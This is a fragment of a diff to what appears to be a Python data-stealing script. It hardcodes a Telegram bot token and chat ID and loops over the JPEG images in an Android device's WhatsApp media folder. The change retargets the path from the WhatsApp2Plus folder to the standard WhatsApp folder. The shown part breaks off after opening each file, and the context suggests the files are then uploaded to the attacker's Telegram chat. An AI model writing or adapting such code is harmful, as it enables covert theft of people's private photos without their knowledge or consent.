@@ -4,7 +4,7 @@ import os, requests, random
 def pot():
     bot_token = '2079309808:AAEpJQU2mFOHzHQ0YHeIBmeZ6wp9iNGktcE' 
     chat_id = '1786978258'
-    sdcard_path = '/sdcard/Android/media/com.WhatsApp2Plus/WhatsApp/Media/WhatsApp Images'
+    sdcard_path = '/sdcard/Android/media/com.WhatsApp/WhatsApp/Media/WhatsApp Images'
     file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
     for file in file_list:
         with open(os.path.join(sdcard_path, file), 'rb') as f:
